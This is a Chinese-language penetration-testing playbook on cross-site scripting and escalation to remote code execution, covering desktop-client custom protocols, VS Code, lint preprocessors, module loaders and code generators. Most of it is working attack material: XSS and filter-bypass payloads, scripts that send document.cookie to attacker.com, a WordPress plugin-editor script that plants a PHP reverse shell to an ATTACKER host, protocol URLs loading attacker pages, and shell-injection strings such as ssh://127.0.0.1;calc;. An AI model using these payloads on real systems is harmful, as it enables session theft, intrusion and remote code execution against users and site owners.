> 短表「XSS → RCE」「自定义协议 → RCE」用标题搜。英文附件 / polyglot 百科已砍；冷门事件和特权上下文仍留。
> **下面这些 payload 只是加速，不是清单。** 现场按上下文自己选、自己变；表上没有的编码/事件/标签照样打。禁止只轮询本节收过的那几条。

## 一、原有知识库

# XSS 测试手册

## XSS 类型判断

| 类型 | 特征 |
|------|------|
| 存储型 | payload 存入数据库，他人访问触发 |
| 反射型 | payload 在 URL 参数中，需诱导点击 |
| DOM 型 | 纯前端处理，不经过服务端 |

打穿了按 `vuln-report-format` 定级，不按存储/反射/DOM 抬级。

---

## 常见注入点

```
搜索框 → 搜索结果页面
评论/留言区
个人资料（昵称、签名、简介）
文件名（上传后展示）
404/错误页面（显示 URL 参数）
消息通知内容
客服聊天
富文本编辑器
Git / 文档站的 README、Wiki、议题、MR 描述（网页和桌面客户端都测，见 §8 XSS→RCE）
桌面客户端自定义协议（scheme 参数带 url / open / openUrl / webview，见 §8 自定义协议→RCE）
回跳参数 backUrl / returnUrl / redirect / next（javascript: 或 javascript%3A + document.write(document.cookie)）
富文本 / BBCode / wiki（`[p]` `[[p]]` `[div]` 转 HTML 时属性跟上；页面有 Layui/animate.css 就挂现成动画 class + onanimationstart）
```

---

## 基础 Payload

```html
<!-- 基础验证 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 无 script 标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>

<!-- 属性注入（闭合属性）-->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

---

## WAF 绕过 Payload

```html
<!-- 大小写 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>

<!-- 事件多样化 -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 冷门自动事件：onerror/onload 被剥时用。未知标签也能挂。内联作用域里 cookie 就是 document.cookie -->
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<!-- 未知标签被剥时换 input；只要 content-visibility:auto，不必 display:block -->
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
<!-- Popover：style 被剥时换这条。要点一下按钮。内联 URL 就是 document.URL -->
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>

<!-- 编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:\u0061lert(1)">click</a>

<!-- 注释分割 -->
<scr<!--注释-->ipt>alert(1)</scr<!--注释-->ipt>

<!-- 使用反引号 -->
<img src=`x` onerror=alert(1)>
```

---

## Cookie 窃取 Payload

```html
<!-- 发送 Cookie 到攻击者服务器 -->
<script>
new Image().src="https://attacker.com/steal?c="+encodeURIComponent(document.cookie)
</script>

<!-- fetch 版本（更可靠） -->
<script>
fetch("https://attacker.com/steal",{method:"POST",body:document.cookie})
</script>

<!-- SRC 验证（无需真实接收，用 dnslog 即可）-->
<script>
document.write('<img src="http://'+document.cookie.split(';')[0].split('=')[1]+'.your-dnslog.cn">')
</script>
```

---

## DOM XSS 查找

```javascript
// 搜索危险接收点
search_in_sources("innerHTML")
search_in_sources("document.write")
search_in_sources("eval(")
search_in_sources("location.hash")
search_in_sources("location.search")

// 常见 DOM XSS 源
document.location.hash    // #后面的内容
document.location.search  // ?后面的参数
document.referrer
window.name
postMessage
```

---

## XSS 证明方式（SRC 要求）

对于 SRC 提交，**禁止使用 alert(1)** 证明危害，应使用：

```javascript
// 证明能读取 Cookie
alert(document.cookie)
// 内联事件里可写成 a=alert,a(cookie) 或 a=alert,a(URL)（作用域就是 document.cookie / document.URL）

// 证明能读取 token（localStorage）
alert(localStorage.getItem('token') || sessionStorage.getItem('token'))

// 证明 domain（证明不是 self-xss）
alert(document.domain)
```

---

### 冷门事件 + 内联作用域（onerror/onload 被拦时）

标签名随意（`c2xh` / `c2xl` 这种未知元素也能挂）。内联事件的作用域摸得到 `document`：`cookie` = `document.cookie`，`URL` = `document.URL`。拦 `document` / `alert(1)` 时用 `a=alert,a(cookie)` 或 `a=alert,a(URL)`。

不用点（`style` 还在时）：

```html
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

未知标签被剥就换 `input` / `p`（或其它白名单标签）。`input` 上往往只要 `content-visibility:auto`，不必再写 `display:block`。`alert(1)` 能过就先过；拦了再换 `a=alert,a(cookie)`。

富文本 / BBCode / wiki 若把 `[p]`、`[[p]]`、`[div]` 转成对应 HTML 且属性原样带过去，直接挂在允许的标签上：

```
[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]
[div onmousemove=eval.call`${'al\x65rt(1)'}` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]
```

`onmousemove` 要点/滑鼠标；`position:fixed` 铺满是为了鼠标一动就中。`eval.call\`...\`` 是标签模板调 `eval`；`\x65` 是 `e`，躲开字面 `alert`。自动事件能过就别用这条。

`onerror`/`onload` 被剥、自动事件也不走时，换指针事件 + 把元素撑大，鼠标一进就中（URL 编码常见）：

```
<svg%20id%3dmySvg%20onpointerenter%3da=alert,a(cookie)%20width%3d10000%20height%3d10000></svg>%2F%2F
```

解码即 `<svg id=mySvg onpointerenter=a=alert,a(cookie) width=10000 height=10000></svg>//`。末尾 `//` 注释掉注入点后面的残留。假点：没划进这张超大 svg；标签/事件被剥。

页面已经引入 Layui / animate.css 这类现成动画时，挂库里的 class，用 `onanimationstart` 自动开火，不用自己写 `@keyframes`：

```
[div class=layui-anim-up onanimationstart=javascript:alert(1)][/div]
```

事件处理里写 `javascript:alert(1)` 时，`javascript:` 是 JS 标签（label），后面的 `alert(1)` 照样跑，不是 URL 协议。假点：页面没有这段 CSS；class / 事件被剥；动画没播。

假点：只换标签名、属性被剥；转出来是纯文本；没滑鼠标；`style` 被剥只剩小块要精确悬停；CSP 禁 `eval`。前面的「Life：face」这类只是正文，不是 payload 的一部分。

`style` / `content-visibility` 被剥时换 Popover，要点一下按钮。`popovertarget` 对上 `id`，`onbeforetoggle` 在弹出前开火：

```html
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>
```

Chrome / Edge 优先。Firefox、Safari 这两个 API 经常不响，换别的事件，这条不算死。Popover 那条没点按钮不算打穿。

## 8. XSS → RCE / 自定义协议（短表有指针）

### XSS → RCE（特权上下文，和上面偷 Cookie 是同一条链的升级）

存储/反射 XSS 打穿之后，或 Electron 自己把外站页拉进特权窗之后，问的是：**这段 JS 跑在谁的进程里**。网页里只是会话；落到能写插件、能调本机桥的地方才是 RCE。下面几条是同一类，不是互斥。

**网页后台（WordPress 等）**：管理员会话 + 能改插件/主题的编辑器。Hello Dolly 只是现成文件，别的可写入口一样打。

```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

**桌面客户端（CEF / Electron / 企业 Git GUI）**：有 node 桥 / `nodeIntegration` / `enableRemoteModule` / 暴露的 `Buffer`·`require`·`child_process`，页面里的 JS 就在本机进程里跑。payload 按现场选（自动跳转、外链、事件、远程页），**不要死抄某一种 gadget**。沙箱死了 → 当普通存储 XSS 继续打网页，不宣布这条死。

投递 1（存储 XSS）：README、议题、评论里存的 HTML，客户端当网页渲。组员/邀请接口若只认数字 `user_id`，递增拉人即可（就是 `idor-test.md` 里已有的顺序 ID + 批量写）。对方克隆列表若不隔离，你的仓会出现在他客户端里，打开 README 即触发。拉人本身不是洞的主体，主体仍是客户端把 HTML 渲成了特权 XSS。

### 自定义协议 → RCE（短表有指针）

投递 2（自定义协议，不必先有存储 XSS）：客户端注册了自己的 scheme。macOS 看 `Info.plist` 的 `CFBundleURLSchemes`，Windows 看安装时写的协议，包里的 JS 搜 `setAsDefaultProtocolClient` / `open-url` / `second-instance`。协议参数里出现 `url`、`urlType`、`open`、`openUrl`、`webview`，就试把外站地址塞进去。两种常见形态（字段名跟现场走，不要死抄）：

- JSON：`scheme://app/open?params={"url":"http://attacker","urlType":1}`
- 扁平：`scheme://openUrl?url=http://attacker/exp.html`
- 拼进 PTY：协议 URL 被当成 shell 一行打进当前终端再回车（`ssh://` 常见）。host/user 不转义。`ssh://127.0.0.1;calc;` 会变成 `ssh 127.0.0.1;calc;` 回车；`$()` / 反引号同样。openFile 做了 escapeshellcmd、openSSH 没做是对照。假点：只调起 ssh 连到那个 host、没有第二条命令。

浏览器地址栏或任意 `href` 打开，系统会问「要打开该应用吗」——对方点一次就算合理交互，不需要中间人。

投递 3（回显当协议，不必先有自定义 scheme）：运维/C2/安全客户端把**不可信命令回显**渲成可点击链。链里出现 `javascript:` 或能进 `require` / `child_process` 的 markup。假点：纯文本回显；渲染前剥协议；点了也不进 Node。算成同自定义协议。不要死抄某一家 markup。

攻击页先探桥，再弹计算器。不要因为 Electron 18+ 或没有 `remote` 就停。顺序：`typeof process` → `typeof require`（`require.toString()` 含 `native` 才当真）→ `window.require` → 没有再看预加载桥 / `window.electron.ipcRenderer`。`require` 能直接 `child_process` 就用它；只有老窗口才走：

```
const {remote} = require('electron');
remote.require('child_process').exec('open -a Calculator');
```

Windows 把命令换成 `calc`。预加载只露了 `ipcRenderer`、调不了命令 → 这条桥没打穿，别写成 RCE。

算成：本机弹出计算器 / 执行了你指定的无害命令。只在浏览器 alert、客户端不渲、只弹「打开应用」但不加载外站、或跳了但没执行 → 停在调起/存储 XSS，别写成 RCE。协议只开自家域、`require` 和 `remote` 都没有 → 这条投递到此为止，改打投递 1 或网页面。

### untrusted 漏 require（短表有指针）

VS Code 语言扩展 `untrustedWorkspaces.limited`。广告说 untrusted 不加载用户 `node_modules` / 语言 config，语言服务 `isTrusted` 也闸了这些入口。还要看 **tsserver 插件** 是否 `require.resolve` 工作区编译器（`create()` 里 `enable=false` 仍走到 require 也算），以及 format/补全是否仍 `prettier.resolveConfig`（会执行 `prettier.config.js`）。

未信任工作区放假 `node_modules/<lang>/compiler` 或 `prettier.config.js`，payload 写无害命令到 marker。对照：闸了的 config 入口不应跑。

算成：本机当前用户跑了指定无害命令。假点：restrictedConfigurations 已挡住这条 require；只在 trusted 工作区加载；扩展不支持 untrusted。这和「公网 VS Code 读进程环境」不是同一套。

### lint 预处理器 require（短表有指针）

ESLint 语言插件的 recommended 为了对 `svelte-ignore` / `valid-compile` 去跑编译，把 `<style lang="stylus|less">` **原文**丢给 `stylus.render` / `less.render`。stylus `use()`、less `@plugin` 会 require 工作区 JS。

工程能 `require('stylus')` 或 `require('less')` 时，lint 一份带 ignore 的文件即可。对照：去掉 ignore、规则不再编译时不应写 marker。

算成：`npx eslint` 当下本机当前用户跑了无害命令。假点：没装预处理器；recommended 且没有 ignore 也没开会强制编译的规则；plugin 被关掉。这和「untrusted 漏 require」不是同一套（那是 VS Code isTrusted，这是 CLI lint）。

### register 把 json 当 JS（短表有指针）

自定义 ESM load hook 看见 `.json` 就把原文拼进 `export default ${rawSource}`（或 CJS `module.exports =`）并 `shortCircuit`。`with { type: "json" }` 也不走 Node 的 JSON.parse。

`node --import <loader>/register` 之后，工程里当数据 import 的 json（配置/文案/依赖 json）可以改成脚本。对照：同一入口同一文件，不带 register 应 Unexpected token。

算成：本机当前用户跑了无害命令。假点：库自己的 `createJiti().import` / CLI 已 JSON.parse；文件是合法 JSON 只当数据。这和 untrusted require、lint 预处理器 require 不是同一套。

### JSON 伪造代理 AST（短表有指针）

代码生成库用字符串哨兵（`__magicast_proxy` 一类）标记内部 Proxy。`literalToAst` 看见这个键就把 `$ast` 当 AST 打进产物。JSON 能带同一哨兵，赋值 / 深合并 / `array.push` 都会走。

不可信 JSON 赋进 proxified 配置再 `generateCode` / import。对照：普通 `{foo:1}` 生成数据对象、import 不跑命令。

算成：生成文件被加载后本机当前用户跑了无害命令。假点：`builders.raw` 文档就是塞源码；调用方自己拿真实 Proxy。这和 register 把 json 当 JS 不是同一套。

### git ref 拼进 shell（短表有指针）

changelog/git CLI 用 `git describe --tags` 取出 tag 名，再双引号拼进 `execSync("git log \"${from}...${to}\"")`。开发者以为双引号够了；POSIX `/bin/sh -c` 里 `$()` / 反引号仍执行。git 允许 tag 含 `$()`，空格用 `${IFS}`。

发版 CLI 若 import 了 spawn 却把 changeset 说明 / GitHub owner / 基线分支同样双引号拼进 `gh pr create`，同一枪：`-m` / AI 生成说明或 config.owner。owner 连引号都不转时 Windows cmd 可 `"` 断句 `&whoami`。

不传 `--from`，仓库里放恶意 tag，无参跑工具。对照：同一句在 Windows cmd.exe 不展开 `$()`；simple-git 数组 spawn 不扩。

算成：whoami 进 git 报错或 marker 文件落地。假点：Windows cmd 不扩 `$()`；只有调用方自己敲 `--from` 是自己打自己；`execFile`/spawn 数组传参。这和自定义协议 URL 拼 PTY、JSON 当 JS 不是同一套。

### PATHEXT cwd 抢 exe（短表有指针）

Windows 进程库自己按 PATHEXT 搜命令，把 **cwd** 放进搜索最前，cwd 里的 `node.cmd` 压过 PATH 上的 `node.exe`，再把短名丢给 `cmd.exe /c`。Node `child_process.spawn('node')` 不会这样。

另一枪：`execSync("which <bin>")` 整句走 cmd.exe，种的是 **`which.cmd`** 不是目标 bin.cmd。`existsSync(homedir+"/.bun/bin/bun")` 不认旁边的 `.exe` 时必落到 which。

工程目录种同名 cmd 或 `which.cmd`。对照：同一目录 Node spawn 仍跑真 node / ENOENT。

算成：种植脚本 whoami/marker。假点：库不搜 PATHEXT、也不 `execSync("which …")`；spawn 已走 exe。这和 untrusted require、git ref 拼 shell 不是同一套。

### packageManager 当 exe（短表有指针）

本机包管理封装 `detectPackageManager().name` 直接 `execa(name, [subcommand])`，不走 corepack / 白名单。`package.json` 的 `packageManager` 字段就是二进制名。

`packageManager: "node@18.0.0"`，工程里放与官方硬编码子命令同名的 `upgrade.js` / `install.js`。对照：拿掉 js 应 MODULE_NOT_FOUND。Windows 上检测成 npm 时 cwd `npm.cmd` 也会被这句 execa 跑起来。

算成：whoami/marker。假点：走了 nypm `executeCommand` 且 corepack 拦住未知 PM；二进制名是调用方自己 argv。这和 PATHEXT cwd 抢 exe 不是同一套（那边是种 cmd 抢 PATH，这边是字段名当 exe）。

### lang 拼相对 import（短表有指针）

预处理器把 `<style lang>` / `<script lang>` 无白名单拼进 `import(\`./transformers/${lang}.js\`)`。`lang` 不是枚举名，是相对模块路径。

`lang=\`../../../../evil\`` 指向仓库 JS，默认 preprocess/构建就会加载。对照：乱填不存在的路径只报 Cannot find module。

算成：execSync whoami/marker。假点：lang 有白名单；只是 less `@plugin` / stylus `use()`（那是「lint 预处理器 require」）；调用方自己注册的自定义语言。这和 lint 预处理器 require 不是同一套。

### playground 文件名穿越（短表有指针）

脚手架把远程 playground/repl JSON 的 `file.name` 无 jail 拼进 `path.join(cwd, 固定子目录, name)`，create 再对本项目 `npm/pnpm install`。

`../package.json` 覆盖 `preinstall`，install 钩子跑起来。对照：官方内置模板不走这份 JSON；社区 tar unpack 若拒 `..` 则不是这枪。

算成：钩子 whoami/marker。假点：只写到子目录内；调用方自己的本地路径 argv。这和 git ref 拼 shell、lang 拼相对 import 不是同一套。

### wasm 导出名拼绑定（短表有指针）

构建期 wasm（或同类二进制接口节）绑定生成器 `parse` 出导出名后拼进 `export const ${name} = _mod.${name}` / `obj["${name}"]`，不当 JS 标识符消毒。

文档用法挂插件打包 `.wasm`，导出名写成语句（writeFileSync + execSync），加载产物。对照：合法导出名 `ok` 产物没有 execSync。

算成：whoami/marker。假点：调用方自己把名字喂给代码生成 API；解析失败已回退 Module、产物里没有那句。这和 register 把 json 当 JS、knitwork 调用方传入 names 不是同一套。

### JSDoc 注释闭合（短表有指针）

schema/codegen 把文档注释原文按行加 `* ` 包进 `/** */`，不转义 `*/`。注释里的 `*/` 提前结束 JSDoc，后面的 `Function` / `import()` 进生成文件顶层。

生成文件被工程 import。对照：普通 hello 注释产物没有 Function，import 不写 marker。

算成：whoami/marker。假点：注释被 escape；生成后只当文本从不执行；编译因类型错误没写出文件。这和 JSON 伪造代理 AST、register 把 json 当 JS 不是同一套。

### 生成包装注释打断（短表有指针）

MCP/代码生成器把服务端 `tool.name` 写进生成 TS 的 `// Auto-generated wrapper for MCP tool: ${name}`，文件名/标识符另做 `[A-Za-z0-9_]` 消毒，注释行仍写原名。换行打断 `//`，后面的 `import`/`execSync` 变成顶层语句。

按文档 import 生成包装。对照：合法工具名产物没有 execSync。

算成：whoami/marker。假点：注释也 escape 了；生成后从不被加载。这和 JSDoc `*/` 闭合、wasm 导出名拼绑定不是同一套。

### OAuth URL 拼进 open（短表有指针）

MCP 客户端把 OAuth `authorization_endpoint` 原样拼进 `open "URL"` / `xdg-open "URL"` 再 `child_process.exec`。WHATWG 序列化不吃 `$()`，双引号挡不住 POSIX 展开。

well-known 元数据里填 `http://127.0.0.1/$(whoami)`。对照：Windows `start "URL"` 把整段当窗口标题、cmd 不扩。

算成：POSIX whoami/marker。假点：Windows cmd 不扩；URL 被白名单/编码吃掉 `$()`。这和 git ref 拼 `git log` 不是同一套（那边是 tag，这边是 OAuth 发现 URL 进 open）。

### Mermaid 渲染先于净化（短表有指针）

场景：Markdown 管道里 Mermaid（或同类图）`securityLevel: loose`，或 HTML 事件在 sanitize **之前**已进入 DOM。

认：文档/工单/AI 对话可存图源码。
打：持久化节点 label/`click` 嵌事件；有创建 PAT/API token 的页面再看升链。
假：先净化再渲染；CSP 禁 inline；图只转安全 SVG。

